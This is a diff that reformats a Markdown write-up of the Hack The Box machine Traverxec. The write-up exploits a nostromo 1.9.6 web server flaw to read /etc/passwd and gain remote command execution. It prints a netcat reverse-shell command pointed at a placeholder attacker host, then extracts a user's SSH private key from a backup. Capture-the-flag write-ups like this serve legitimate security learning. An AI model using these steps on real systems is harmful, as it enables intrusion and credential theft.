@@ -42,7 +42,7 @@ debian $ curl -v 10.10.10.165
 ...
 < HTTP/1.1 200 OK
 < Date: Thu, 16 Apr 2020 01:48:05 GMT
-<span style="color:red">< Server: nostromo 1.9.6</span>
+< Server: nostromo 1.9.6  <-----
 < Connection: close
 < Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
 < Content-Length: 15674
@@ -72,7 +72,8 @@ Server: nostromo 1.9.6
 Connection: close
 Last-Modified: Fri, 25 Oct 2019 18:34:30 GMT
 Content-Length: 1395
-Content-Type: text/html<br>
+Content-Type: text/html
+
 root:x:0:0:root:/root:/bin/bash
 ...
 david:x:1000:1000:david,,,:/home/david:/bin/bash
@@ -81,8 +82,8 @@ david:x:1000:1000:david,,,:/home/david:/bin/bash
 
 Unfortunetly for the users of nostromo, and fortunetly for us this gets much
 worse when we `POST` instead of `GET`-ing. We can post commands to `/bin/sh`
-and instead of giving us the binary contents, the server executes it with
-**our** input, thus we gain remote command execution with the same permission
+and instead of giving us the binary contents, the server executes it with **our**
+input, thus we gain remote command execution with the same permission
 as nostromo itself has.
 
 The following shell script implements this.
@@ -98,14 +99,18 @@ intend to execute. The two `echo` commands are necessary for nostromo to
 return the output instead of failing with a `500 Internal Server Error`.
 
 Using our RCE script we get a reverse shell with nostromo's persmissions.
-```
+
 First shell on hacker computer:
+```
 debian $ nc -lvp 9999
 www-data@traverxec $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@traverxec $ hostname
-traverxec<br>
+traverxec
+```
+
 Second shell on hacker computer:
+```
 debian $ ./rce.sh 10.10.10.165 "nc hacker_ip 9999 -e /bin/sh"
 ```
 
@@ -144,7 +149,8 @@ I take a look at `nhttpd.conf` and it contains the following interesting section
 ```
 www-data@traverxec $ cat /var/nostromo/conf/nhttpd.conf
 ...
-# HOMEDIRS [OPTIONAL]<br>
+# HOMEDIRS [OPTIONAL]
+
 homedirs            /home
 homedirs_public     public_www
 ...
@@ -160,7 +166,7 @@ www-data@traverxec $ find /home/david/public_www
 /home/david/public_www
 /home/david/public_www/index.html
 /home/david/public_www/protected-file-area
-<span style="color:red">/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz</span>
+/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz <-----
 /home/david/public_www/protected-file-area/.htaccess
 www-data@traverxec $ tar tf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
 home/david/.ssh/
@@ -171,7 +177,7 @@ home/david/.ssh/id_rsa.pub
 
 As you can see above there are some very bad news for david as we found his
 ssh private key. We copy the tarball to a temporary location, extract it, and
-cat our id_rsa file to stdout.
+cat our `id_rsa` file to stdout.
 ```
 www-data@traverxec $ cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp/
 www-data@traverxec $ cd /tmp; tar xf backup-ssh-identity-files.tgz
@@ -219,7 +225,7 @@ david@traverxec $ find /home/david
 /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
 /home/david/public_www/protected-file-area/.htaccess
 /home/david/bin
-<span style="color:red">/home/david/bin/server-stats.sh</span>
+/home/david/bin/server-stats.sh <-----
 /home/david/bin/server-stats.head
 /home/david/.bash_history
 /home/david/.bash_logout
@@ -232,7 +238,8 @@ of the webserver log, but most importantly does **not** require a password to do
 it. Now we look at the code and see why.
 ```
 david@traverxec $ cat /home/david/bin/server-stats.sh
-#!/bin/bash<br>
+#!/bin/bash
+
 cat /home/david/bin/server-stats.head
 echo "Load: `/usr/bin/uptime`"
 echo " "
